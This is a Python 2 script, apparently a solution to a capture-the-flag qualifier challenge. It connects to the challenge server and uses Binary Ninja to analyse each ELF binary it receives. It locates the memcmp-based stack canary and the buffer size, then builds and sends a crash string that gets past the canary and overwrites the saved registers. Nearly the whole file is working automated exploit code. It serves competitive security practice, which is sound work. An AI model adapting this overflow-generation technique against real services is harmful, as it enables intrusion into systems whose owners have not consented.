#!/usr/bin/env python

import sys
try:
    import binaryninja
except ImportError:
    sys.path.append("/Applications/Binary Ninja.app/Contents/Resources/python/")
    import binaryninja
import socket
import base64

s = socket.socket()
s.connect(('334_cuts_22ffeb97cf4f6ddb1802bf64c03e2aab.quals.shallweplayaga.me', 10334))
print "Msg: " + s.recv(1024)

def readUntil(s, delim):
    msg = ""
    while delim not in msg:
        msg += s.recv(1)

    return msg

msg = readUntil(s, '\n')
while True:
    print
    print

    # They send us the challenge name to process.
    msg = readUntil(s, '\n')
    if 'segfault' in msg:
        print msg
        break
    chal = msg.strip()

    # Open a binary view to the challenge as an elf
    print "Analyzing {0}".format(chal)
    bv = binaryninja.BinaryViewType["ELF"].open(chal)
    bv.update_analysis_and_wait()
    
    # start at the entry point
    print "Entry Point: {0:x}".format(bv.entry_point)
    entry = bv.entry_function # Get the entry point as a function object
    start = None
    
    # Iterate over the basic blocks in the entry function
    entry_calls = []
    for block in entry.low_level_il:
        # Iterate over the basic blocks getting il instructions
        for il in block:
            # We only care about calls
            if il.operation == binaryninja.core.LLIL_CALL:
                entry_calls.append(il)
    
    start_call = entry_calls[1]            
    start = bv.get_function_at(start_call.operands[0].value)
    
    print "start: {0}".format(start)

    # Do the same thing with main, it's the first call in start
    main = None
    for block in start.low_level_il:
        for il in block:
            if il.operation != binaryninja.core.LLIL_CALL:
                continue
    
            main = bv.get_function_at(il.operands[0].value)
    
    print "main: {0}".format(main)
    
    # Collect all the call instructions in main
    calls = []
    for block in main.low_level_il:
        for il in block:
            if il.operation == binaryninja.core.LLIL_CALL:
                calls.append(il)

    # If there are 5 calls, then the memcmp is the second call. With 6 calls its the 3rd.
    if len(calls) == 5:
        read_buf = calls[0]
        memcmp = calls[1]
    else:
        read_buf = calls[1]
        memcmp = calls[2]
    
    # Query the parameters to the memcmp
    # memcmp(dst, src, length)
    canary_frame = main.get_parameter_at(memcmp.address, None, 0)
    canary_address = main.get_parameter_at(memcmp.address, None, 1)
    canary_width = main.get_parameter_at(memcmp.address, None, 2)
    
    # Use that to read the canary
    canary = bv.read(canary_address.value, canary_width.value)
    
    buffer_frame = main.get_parameter_at(read_buf.address, None, 0)
    
    # The canary is between the buffer and the saved stack registers
    buffer_size = (buffer_frame.offset - canary_frame.offset) * -1
    print buffer_size
    
    # Fill up the buffer
    crash_string = "a" * buffer_size
    # Append the checked bytes of the canary check (it's always 4)
    crash_string += canary[:canary_width.value]
    
    # Pad out the rest of the string canary buffer
    crash_string += "a" * ((canary_frame.offset * - 1) - canary_width.value)
    
    # overwrite the saved registers
    crash_string += 'eeee'
    crash_string += '\n'
    
    # Send the crashing string to the service
    b64 = base64.b64encode(crash_string)
    print chal, canary, crash_string.strip(), b64

    # Send the crashing string
    s.send(b64 + "\n")
